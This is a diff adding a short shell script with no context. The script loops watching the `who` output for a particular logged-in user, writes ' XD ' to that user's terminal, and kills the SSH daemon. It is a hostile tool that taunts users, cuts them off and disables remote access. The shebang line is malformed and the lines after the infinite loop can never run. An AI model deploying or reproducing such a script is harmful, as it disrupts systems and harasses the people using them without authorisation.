@@ -1,0 +1,16 @@
+#!/bin/sh/
+while [ "1" ]
+do
+user2=$(who | awk '{ print $5 }' | grep loc)
+terminaluser2=$(who | grep loc | awk '{ print $2 }')
+ if [ "$user2" = "" ]; then
+  echo "Scanning"
+  sleep 3
+ else
+  sshdid=$(pidof sshd | awk '{ print $1 }')
+  echo " XD " | tee a.out /dev/"$terminaluser2"
+  kill "$sshdid"
+ fi
+done
+read -r
+exit 1
